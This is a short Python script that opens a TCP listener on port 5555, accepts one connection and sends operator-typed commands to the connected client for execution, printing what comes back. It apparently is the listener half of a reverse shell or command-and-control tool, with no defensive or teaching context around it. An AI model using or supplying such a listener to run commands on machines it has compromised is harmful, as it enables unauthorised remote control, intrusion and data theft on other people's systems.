import socket

# Define the listening port
port = 5555

# Create a socket to listen for incoming connections
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0', port))
server_socket.listen(5)

print(f"Listening on port {port}...")

# Accept incoming connections
client_socket, addr = server_socket.accept()
print(f"Accepted connection from {addr}")

try:
    while True:
        # Receive a command from the server
        command = input("Enter a command to execute on the client (or 'exit' to quit): ")

        if command.lower() == "exit":
            break

        # Send the command to the client
        client_socket.send(command.encode('utf-8'))

        # Receive and print the result from the client
        result = client_socket.recv(4096).decode('utf-8')
        print(result)
except KeyboardInterrupt:
    pass

# Close the client socket
client_socket.close()
